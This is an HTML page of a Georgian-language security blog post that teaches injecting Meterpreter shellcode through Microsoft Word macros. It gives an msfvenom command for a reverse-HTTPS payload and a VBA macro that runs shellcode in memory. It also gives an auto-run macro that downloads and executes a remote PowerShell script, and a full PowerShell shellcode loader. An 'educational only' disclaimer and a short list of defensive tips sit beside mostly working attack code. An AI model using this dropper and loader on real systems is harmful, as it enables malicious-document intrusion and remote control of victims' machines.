@@ -1,0 +1,266 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>Injecting Meterpreter Shellcode - ReDefense</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+		<meta property="og:title" content="Injecting Meterpreter Shellcode" />
+<meta property="og:description" content="მოგესალმებით
+კიბერ-კრიმინალები ხშირად მიმართავენ მაკროებს MS Word ან MS Excell - ის დოკუმენტებში, თუმცა ნელ-ნელა ეს ტენდენცია იკლებს რადგანაც Microsoft - მა აკრძალა მაკროების გაშვება ისეთ ფაილებზე, რომლებიც ინტერნეტიდან არის გადმოწერილი.
+დღევანდელ პოსტში ვისაუბრებთ მარტივ მაკროზე, რომლის მიზანიცაა MS Word - ის პროცესში Meterpreter Shellcode - ს ინექცია შემდეგი კლასიკური მეთოდით:
+1. VirtualAlloc2. RtlMoveMemory3. CreateThreadშენიშვნა: ეს პოსტიც და ყველა სხვა პოსტიც, ამ ბლოგზე არის მხოლოდ საგანმანათლებლო. ნებისმიერი არასანქცირებული ქმედება ისჯება კანონდებლობით." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://redefense.xyz/post/injecting-shellcode/" /><meta property="article:section" content="post" />
+<meta property="article:published_time" content="2023-06-17T08:38:06+04:00" />
+<meta property="article:modified_time" content="2023-06-17T08:38:06+04:00" />
+
+
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="ReDefense" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">ReDefense</div>
+					<div class="logo__tagline">ტექნიკური საკითხები კიბერ უსაფრთხოებით დაინტერესებული პირებისთვის</div>
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">Injecting Meterpreter Shellcode</h1>
+			<div class="post__meta meta">
+<div class="meta__item-datetime meta__item">
+	<svg class="meta__icon icon icon-time" width="16" height="14" viewBox="0 0 30 28"><path d="M15 0C7 0 1 6 1 14s6 14 14 14 14-6 14-14S23 0 15 0zm0 25C9 25 4 20 4 14S9 3 15 3s11 5 11 11-5 11-11 11zm1-18h-2v8.4l6.8 4.4L22 18l-6-3.8V7z"/></svg><time class="meta__text" datetime="2023-06-17T08:38:06&#43;04:00">June 17, 2023</time></div></div>
+		</header>
+		<div class="content post__content clearfix">
+			<p>მოგესალმებით</p>
+<p>კიბერ-კრიმინალები ხშირად მიმართავენ მაკროებს <code>MS Word</code> ან <code>MS Excell</code> - ის დოკუმენტებში, თუმცა ნელ-ნელა ეს ტენდენცია იკლებს რადგანაც Microsoft - მა აკრძალა მაკროების გაშვება ისეთ ფაილებზე, რომლებიც ინტერნეტიდან არის გადმოწერილი.</p>
+<p>დღევანდელ პოსტში ვისაუბრებთ მარტივ მაკროზე, რომლის მიზანიცაა <code>MS Word</code> - ის პროცესში <code>Meterpreter Shellcode</code> - ს ინექცია შემდეგი კლასიკური მეთოდით:</p>
+<pre tabindex="0"><code>1. VirtualAlloc
+2. RtlMoveMemory
+3. CreateThread
+</code></pre><p><strong>შენიშვნა</strong>: ეს პოსტიც და ყველა სხვა პოსტიც, ამ ბლოგზე არის მხოლოდ საგანმანათლებლო. ნებისმიერი არასანქცირებული ქმედება ისჯება კანონდებლობით.</p>
+<p>პირველ რიგში დავაგენერიროთ <strong>Meterpreter</strong> შელკოდი, რომელიც იქნება განკუთვნილი 64 ბიტიანი პროცესისთვის და გაეშვება როგორც ნაკადი (thread).</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<span style="color:#ae81ff">192.168</span>.<span style="color:#ae81ff">131.129</span> LPORT=<span style="color:#ae81ff">443</span> EXITFUNC=thread -f vbapplication
+</code></pre></div><p><img src="/images/inject-shellcode/Untitled.png" alt="Untitled"></p>
+<p>ვქმნით ახალ ვორდის ფაილს და ვწერთ მაკროს და ვანხორციელებთ შემდეგ ოპერაციებს:</p>
+<p><img src="/images/inject-shellcode/Untitled%201.png" alt="Untitled"></p>
+<ol>
+<li>ვაიმპორტებთ 3 Win API ფუნქციებს. ეს არის კლასიკური ფუნქციები მექსიერებაში კოდის ინექციისთვის. არაფერი ახალი ამაში არ არის.</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">Private Declare PtrSafe Function CreateThread Lib <span style="color:#e6db74">&#34;KERNEL32&#34;</span> (ByVal SecurityAttributes As Long, <span style="color:#ae81ff">_</span>
+                                                              ByVal StackSize As Long, <span style="color:#ae81ff">_</span>
+                                                              ByVal StartFunction As LongPtr, <span style="color:#ae81ff">_</span>
+                                                              ThreadParameter As LongPtr, <span style="color:#ae81ff">_</span>
+                                                              ByVal CreateFlags As Long, <span style="color:#ae81ff">_</span>
+                                                              ByRef ThreadId As Long) As LongPtr
+                                                              
+
+Private Declare PtrSafe Function VirtualAlloc Lib <span style="color:#e6db74">&#34;KERNEL32&#34;</span> (ByVal lpAddress As LongPtr, <span style="color:#ae81ff">_</span>
+                                                              ByVal dwSize As Long, <span style="color:#ae81ff">_</span>
+                                                              ByVal flAllocationType As Long, <span style="color:#ae81ff">_</span>
+                                                              ByVal flProtect As Long) As LongPtr
+
+Private Declare PtrSafe Function RtlMoveMemory Lib <span style="color:#e6db74">&#34;KERNEL32&#34;</span> (ByVal lDestination As LongPtr, <span style="color:#ae81ff">_</span>
+                                                               ByRef sSource As Any, <span style="color:#ae81ff">_</span>
+                                                               ByVal lLength As Long) As LongPtr
+</code></pre></div><ol start="2">
+<li>buf ცვლადი შეიცავს შელკოდს</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">buf = Array(<span style="color:#ae81ff">252</span>, <span style="color:#ae81ff">72</span>, ... , <span style="color:#ae81ff">213</span>)
+</code></pre></div><ol start="3">
+<li>თითო ბაიტს ვწერთ ახალ მისამართზე</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">addr = VirtualAlloc(<span style="color:#ae81ff">0</span>, UBound(buf), &amp;H3000, &amp;H40)
+    
+    For counter = LBound(buf) To UBound(buf)
+        data = buf(counter)
+        res = RtlMoveMemory(addr + counter, data, <span style="color:#ae81ff">1</span>)
+    Next counter
+</code></pre></div><ol start="4">
+<li>ვქმნით ახალ thread - ს</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">res = CreateThread(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, addr, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0</span>)
+</code></pre></div><p>და ყველა პენტესტერისთვის საყვარელი მომენტი:</p>
+<p><img src="/images/inject-shellcode/Untitled%202.png" alt="Untitled"></p>
+<p>თუმცა პრობლემა იმაშია, რომ ჩვენი შელკოდი პირდაპირ ვორდის ფაილშია “ჩაკერებული”, ის ქმნის იმის რისკს რომ ანტივირუსები მარტივად დააფიქსირებენ. უკეთესი გზა იქნება გამოვიყენოთ <code>powershell</code> ამისათვის და ჩვენი მაკრო დავა უფრო მარტივ კოდამდე:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">Sub Document_Open()
+    MyMacro
+End Sub
+Sub AutoOpen()
+    MyMacro
+End Sub
+Sub MyMacro()
+    Dim cmd As String
+    cmd = <span style="color:#e6db74">&#34;powershell.exe IEX (New-Object Net.WebClient).DownloadString(&#39;http://192.168.131.129/lab/run.ps1&#39;)&#34;</span>
+    CreateObject(<span style="color:#e6db74">&#34;Wscript.Shell&#34;</span>).Run cmd, <span style="color:#ae81ff">0</span>
+End Sub
+</code></pre></div><p><img src="/images/inject-shellcode/Untitled%203.png" alt="Untitled"></p>
+<p>აქ ისედაც ყველაფერი გასაგებია. გადავიდეთ მთავარ საკითხზე: ფაილი <code>run.ps1</code></p>
+<p>პირველ რიგში დავაგენერიროთ ახალი შელკოდი ოღონდ <strong>powershell</strong> ის ფორმატში:</p>
+<p><img src="/images/inject-shellcode/Untitled%204.png" alt="Untitled"></p>
+<p><code>run.ps1</code> მოიცავს შემდეგ კოდს, რომელსაც გავყვებით დეტალურად:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-powershell" data-lang="powershell">
+<span style="color:#75715e"># შელკოდი შემოკლებულია თორე ძაან დიდია :)))</span>
+<span style="color:#66d9ef">[Byte[]]</span> $buf = 0xfc,0x48,0x83 ... 0xda,0xff,0xd5
+
+<span style="color:#75715e"># ბაიტ array - ს სიგრძე ანუ შელკოდის სიგრძე</span>
+$size = $buf.length
+
+<span style="color:#75715e"># ვქმნით მცირე C# ის კოდს, რომელიც აიმპორტებს საჭირო ფუნქციებს</span>
+$NewType = <span style="color:#e6db74">@&#34;
+</span><span style="color:#e6db74">using System;
+</span><span style="color:#e6db74">using System.Runtime.InteropServices;
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">public class ChemiKai {
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">  [DllImport(&#34;kernel32&#34;)]
+</span><span style="color:#e6db74">  public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">  [DllImport(&#34;kernel32&#34;, CharSet = CharSet.Ansi)]
+</span><span style="color:#e6db74">  public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">  [DllImport(&#34;kernel32.dll&#34;, SetLastError=true)]
+</span><span style="color:#e6db74">  public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
+</span><span style="color:#e6db74">}
+</span><span style="color:#e6db74">&#34;@</span>
+
+<span style="color:#75715e"># კომპილირდება ჩვენი C# კოდი და მემორიში იტვირთება როგორც ახალი .NET Assembly</span>
+Add-Type $NewType
+
+<span style="color:#75715e"># ცვლადში ვწერთ ახლად გამოყოფილ მეხსიერებას</span>
+<span style="color:#66d9ef">[IntPtr]</span>$Addr = <span style="color:#66d9ef">[ChemiKai]</span>::VirtualAlloc(0, $size, 0x3000, 0x40)
+
+<span style="color:#75715e"># ვაკოპირებთ ჩვენს შელკოდს $Addr მისამართზე</span>
+<span style="color:#66d9ef">[System.Runtime.InteropServices.Marshal]</span>::Copy($buf, 0, $Addr, $size)
+
+<span style="color:#75715e"># ვქმნით ახალ ნაკადს ანუ thread - ს და ვუთითებთ ახლად გამოყოფილ მეხსიერებას</span>
+<span style="color:#75715e"># სადაც იმყოფება ჩვენი შელკოდი: 0xfc, 0x48 და ა.შ</span>
+$tHandle = <span style="color:#66d9ef">[ChemiKai]</span>::CreateThread(0, 0, $Addr, 0, 0, 0)
+
+<span style="color:#75715e"># ამას ქვემოთ განვმარტავ</span>
+<span style="color:#66d9ef">[ChemiKai]</span>::WaitForSingleObject($tHandle, <span style="color:#66d9ef">[uint32]</span><span style="color:#e6db74">&#34;0xFFFFFFFF&#34;</span>)
+</code></pre></div><p>კომენტარები კოდში ისედაც ნათელს ხდის და ბევრს აღარ დავწერ. აღსანიშნავია მხოლოდ ბოლო ლაინი კოდის:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-csharp" data-lang="csharp">WaitForSingleObject(<span style="color:#960050;background-color:#1e0010">$</span>tHandle, [uint32]<span style="color:#e6db74">&#34;0xFFFFFFFF&#34;</span>)
+</code></pre></div><p>სანამ powershell ის პროცესი დაასრულებს ჩვენი ჩვენი ფაილის: <code>run.ps1</code> გაშვებას, ბოლოსკენ როგორც ნახეთ იქმნება ახალი ნაკადი, რომელიც რაღაც სხვა საქმეს აკეთებს(ამ შემთხვევაში გვიკავშირდება ჩვენ) თუ არ გამოვიყენებდით <code>WaitForSingleObject</code> ფუნქცის, მაშინ powershell - ი, მყისიერად დაასრულებდა ჩვენი ფაილის გაშვებას და პროცესიც მოკვდებოდა და რათქმაუნდა ჩვენი ახალი ნაკადიც.</p>
+<p>ამიტომ გვჭირდება ეს ფუნქცია, რომ დაელოდოს ჩვენი ნაკადის დასრულებას და მხოლოდ ამის მერე გაითიშება powershell ის პროცესიც.</p>
+<p>და ბოლოს</p>
+<p><img src="/images/inject-shellcode/Untitled%205.png" alt="Untitled"></p>
+<p>რეკომენდაცია</p>
+<ol>
+<li>განაახლეთ მუდმივად თქვენი სისტემები</li>
+<li>ყოველდღიური საქმიანობისთვის ნუ იყენებთ ადმინისტრატორის უფლებების მქონე იუზერს.</li>
+<li>თუ თქვენთან მაკროები ჯერ კიდევ ეშვება, გათიშეთ საერთოდ. GPO - თი მარტივად გააკეთებთ თუ AD დომეინში ოპერირებთ</li>
+</ol>
+
+		</div>
+	</article>
+</main>
+
+<div class="authorbox clearfix">
+	<figure class="authorbox__avatar">
+		<img alt="ReDefense avatar" src="/img/avatar.png" class="avatar" height="90" width="90">
+	</figure>
+	<div class="authorbox__header">
+		<span class="authorbox__name">About ReDefense</span>
+	</div>
+	<div class="authorbox__description">
+		ტექნიკური საკითხები კიბერ უსაფრთხოებით დაინტერესებული პირებისთვის
+	</div>
+</div>
+
+<nav class="pager flex">
+	<div class="pager__item pager__item--prev">
+		<a class="pager__link" href="/post/domain-persistence/" rel="prev">
+			<span class="pager__subtitle">«&thinsp;Previous</span>
+			<p class="pager__title">AD Domain Persistence (1 ნაწილი)</p>
+		</a>
+	</div>
+</nav>
+
+
+			</div>
+			<aside class="sidebar"><div class="widget-search widget">
+	<form class="widget-search__form" role="search" method="get" action="https://google.com/search">
+		<label>
+			<input class="widget-search__field" type="search" placeholder="SEARCH…" value="" name="q" aria-label="SEARCH…">
+		</label>
+		<input class="widget-search__submit" type="submit" value="Search">
+		<input type="hidden" name="sitesearch" value="https://redefense.xyz">
+	</form>
+</div>
+<div class="widget-recent widget">
+	<h4 class="widget__title">Recent Posts</h4>
+	<div class="widget__content">
+		<ul class="widget__list">
+			<li class="widget__item"><a class="widget__link" href="/post/injecting-shellcode/">Injecting Meterpreter Shellcode</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/domain-persistence/">AD Domain Persistence (1 ნაწილი)</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/attacking-forest/">Forest Compromise - Forging IR-TGT Tickets (1 ნაწილი)</a></li>
+			<li class="widget__item"><a class="widget__link" href="/post/amsi-inmemory-patching/">AMSI In-Memory Patching</a></li>
+		</ul>
+	</div>
+</div>
+<div class="widget-social widget">
+	<h4 class="widget-social__title widget__title">Social</h4>
+	<div class="widget-social__content widget__content">
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="Twitter" rel="noopener noreferrer" href="https://twitter.com/Higgs0x" target="_blank">
+				<svg class="widget-social__link-icon icon icon-twitter" width="24" height="24" viewBox="0 0 384 312"><path d="m384 36.9c-14.1 6.3-29.3 10.5-45.2 12.4 16.3-9.7 28.8-25.2 34.6-43.6-15.2 9-32.1 15.6-50 19.1-14.4-15.2-34.9-24.8-57.5-24.8-43.5 0-78.8 35.3-78.8 78.8 0 6.2.7 12.2 2 17.9-65.5-3.3-123.5-34.6-162.4-82.3-6.7 11.6-10.6 25.2-10.6 39.6 0 27.3 13.9 51.4 35 65.6-12.9-.4-25.1-4-35.7-9.9v1c0 38.2 27.2 70 63.2 77.2-6.6 1.8-13.6 2.8-20.8 2.8-5.1 0-10-.5-14.8-1.4 10 31.3 39.1 54.1 73.6 54.7-27 21.1-60.9 33.7-97.8 33.7-6.4 0-12.6-.4-18.8-1.1 34.9 22.4 76.3 35.4 120.8 35.4 144.9 0 224.1-120 224.1-224.1 0-3.4-.1-6.8-.2-10.2 15.4-11.1 28.7-25 39.3-40.8z"/></svg>
+				<span>Twitter</span>
+			</a>
+		</div>
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="LinkedIn" rel="noopener noreferrer" href="https://linkedin.com/in/lasha-takashvili/" target="_blank">
+				<svg class="widget-social__link-icon icon icon-linkedin" width="24" height="24" viewBox="0 0 352 352"><path d="M0,40v272c0,21.9,18.1,40,40,40h272c21.9,0,40-18.1,40-40V40c0-21.9-18.1-40-40-40H40C18.1,0,0,18.1,0,40z M312,32 c4.6,0,8,3.4,8,8v272c0,4.6-3.4,8-8,8H40c-4.6,0-8-3.4-8-8V40c0-4.6,3.4-8,8-8H312z M59.5,87c0,15.2,12.3,27.5,27.5,27.5 c15.2,0,27.5-12.3,27.5-27.5c0-15.2-12.3-27.5-27.5-27.5C71.8,59.5,59.5,71.8,59.5,87z M187,157h-1v-21h-45v152h47v-75 c0-19.8,3.9-39,28.5-39c24.2,0,24.5,22.4,24.5,40v74h47v-83.5c0-40.9-8.7-72-56.5-72C208.5,132.5,193.3,145.1,187,157z M64,288h47.5 V136H64V288z"/></svg>
+				<span>LinkedIn</span>
+			</a>
+		</div>
+		<div class="widget-social__item widget__item">
+			<a class="widget-social__link widget__link btn" title="Email" href="mailto:%20ltakashvili@protonmail.com;%20goebbelsx@gmail.com">
+				<svg class="widget-social__link-icon icon icon-mail" width="24" height="24" viewBox="0 0 416 288"><path d="m0 16v256 16h16 384 16v-16-256-16h-16-384-16zm347 16-139 92.5-139-92.5zm-148 125.5 9 5.5 9-5.5 167-111.5v210h-352v-210z"/></svg>
+				<span> ltakashvili@protonmail.com; goebbelsx@gmail.com</span>
+			</a>
+		</div>
+
+		
+	</div>
+</div>
+</aside>
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 ReDefense.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
